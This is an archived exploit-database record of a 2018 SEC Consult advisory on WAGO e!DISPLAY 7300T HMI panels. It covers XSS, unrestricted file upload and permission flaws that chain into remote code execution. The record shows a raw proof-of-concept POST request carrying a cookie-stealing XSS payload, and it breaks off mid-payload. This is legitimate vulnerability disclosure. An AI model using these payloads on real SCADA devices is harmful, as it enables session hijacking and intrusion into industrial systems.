{
    "text": "ecve : CVE-2018-12981 CVE-2018-12980 CVE-2018-12979 ， title : WAGO e ! DISPLAY 7300T - Multiple Vulnerabilities - PHP webapps Exploit ， verified : Verified ， exploit_detail : SEC Consult Vulnerability Lab Security Advisory < 20180711-0 > ， title : Remote code execution via multiple attack vectors ， product : WAGO e ! DISPLAY 7300T - WP 4.3 480x272 PIO1 ， vulnerable version : FW 01 - 01.01.10 ( 01 )  ， fixed version : FW 02 ， CVE number : CVE-2018-12979 , CVE-2018-12980 , CVE-2018-12981 ， impact : High ， homepage :  ， found : 2018-04-25 ， by : T. Weber ( Office Vienna )  ， SEC Consult Vulnerability Lab ， An integrated part of SEC Consult ， Europe | Asia | North America ， Vendor description :  ， \"New ideas are the driving force behind our success WAGO is a family-owned ， company headquartered in Minden , Germany. Independently operating for three ， generations , WAGO is the global leader of spring pressure electrical ， interconnect and automation solutions. For more than 60 years , WAGO has ， developed and produced innovative products for packaging , transportation ,  ， process , industrial and building automation markets amongst others. Aside from ， its innovations in spring pressure connection technology , WAGO has introduced ， numerous innovations that have revolutionized industry. Further ground-breaking ， inventions include : the WAGO-I/O-SYSTEM , TOPJOB S and WALL-NUTS.\" ， Source :  ， \"For visualization tasks with CODESYS 2 and CODESYS 3 : WAGO's new e ! DISPLAY ， 7300T Web Panels help you reinforce the quality of your machinery and equipment ， with a refined design and industry-leading software. Learn more about how the ， right Web Panels make a difference. ， HMI components are the finishing touch for machines or systems and they have an ， overwhelming impact on purchase decisions. WAGO offers aesthetically pleasing ， HMIs that leave a lasting impression and significantly increase both the value ， and image of your machine or system. WAGOs e ! DISPLAY 7300T Web Panel is ， available in 4.3'' , 5.7'' , 7.0'' and 10.1'' display sizes.\" ， Source :  ， Business recommendation :  ， HMI displays are widely used in SCADA infrastructures. The link between ， their administrative ( or informational ) web interfaces and the users which ， access these interfaces is critical. The presented attacks demonstrate how ， simple it is to inject malicious code in order to break the security of this ， link by exploiting minimal user interaction. ， As a consequence a computer which is used for HMI administration should not ， provide any possibility to get compromised via malicious script code. ， One possible solution may be e.g. :  ，  * Don't allow email clients ，  * Don't provide Internet access at all on the HMI stations ， SEC Consult recommends to immediately apply the available patches from the vendor. ， A thorough security review should be performed by security professionals to ， identify further potential security issues. ， Vulnerability overview/description :  ， 1 ) Multiple Reflected POST Cross-Site Scripting ( CVE-2018-12981 )  ， Reflected cross site scripting vulnerabilities were identified within multiple PHP ， scripts in the admin interface. The parameter JSON input which is sent to the ， device is not sanitized sufficiently. An attacker can exploit this ， vulnerability to execute arbitrary scripts in the context of the attacked user ， and gain control over the active session. ， This vulnerability is present for authenticated and unauthenticated users !  ， 2 ) Stored Cross-Site Scripting ( CVE-2018-12981 )  ， A stored cross-site scripting vulnerability was identified within the ， \"PLC List\" which can be configured in the web interface of the e ! Display. By ， storing a payload there , an administrative or guest user can be attacked ， without tricking them to visit a malicious web site or clicking on an ， malicious link. ， This vulnerability is only present for authenticated users !  ， 3 ) Unrestricted File Upload and File Path Manipulation ( CVE-2018-12980 )  ， Arbitrary files can be uploaded to the system without any check. It is even ， possible to change the location of the uploaded file on the system. As the ， web service does not run as privileged user , it is not possible to upload a ， file directly to the web root but on many other locations on the file system. ， The normal user 'user' and the administrative user 'admin' can both upload ， files to the system. ， 4 ) Incorrect Default Permissions ( CVE-2018-12979 )  ， Due to incorrect default permissions a file in the web root can be overwritten ， by the unprivileged 'www' user. This is the same user which is used in the ， context of the web server. ， 5 ) Remote code execution via multiple attack vectors ， By stacking vulnerability 1 ) /2 )  , 3 ) and 4 ) with this vulnerability an outside ， attacker can place a malicious script on the device in order to execute arbitrary ， commands as 'www'. This can be done by uploading a web shell or a reverse ， shell. ， Proof of concept :  ， 1 ) Multiple Reflected POST Cross-Site Scripting ( CVE-2018-12981 )  ， The affected endpoints are :  ， The following request is an example for reflected XSS within 'configtools.php' :  ， POST /wbm/configtools.php HTTP/1.1 ， Host : <IP-Address> ， Content-type : text/plain ，  [ ... ]  ， {\"sessionId\" : \"\" , \"aDeviceParams\" : {\"0\" : {\"name\" : \"firewall\" , \"parameter\" :  [ \"iptables\" , \"-get-xml\" ]  , \"sudo\" : true , \"multiline\" : true , \"timeout\" : 10000} , \"1\" : {\"name\" : \"firewall\" , \"parameter\" :  [ \"firewall\" , \"-is-enabled\" ]  , \"sudo\" : true , \"multiline\" : true , \"timeout\" : 10000 , \"dataId\" : \"{DoNotParseAsXml}<img ， src=x onerror=this.src=' ， Steal the cookie via XSS and send it to",
    "time": "2018-07-13"
}